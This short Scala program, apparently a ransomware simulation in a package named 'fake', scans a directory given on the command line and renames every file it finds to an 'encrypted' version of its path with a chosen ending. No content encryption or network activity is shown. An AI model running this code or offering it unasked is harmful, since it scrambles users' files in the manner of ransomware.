package fake

import FakeRansomware._
import java.nio.file._

object AnyRansomware {
	
	def main(args: Array[String]): Unit = {
		val path = args(0)
		val fileEnding = args(1)
		Try {
			val encryptedFiles = scan(Paths.get(path)).map(p => Files.move(p, p.resolveSibling(encrypt(p.toString)(fileEnding))))
		}
	}
}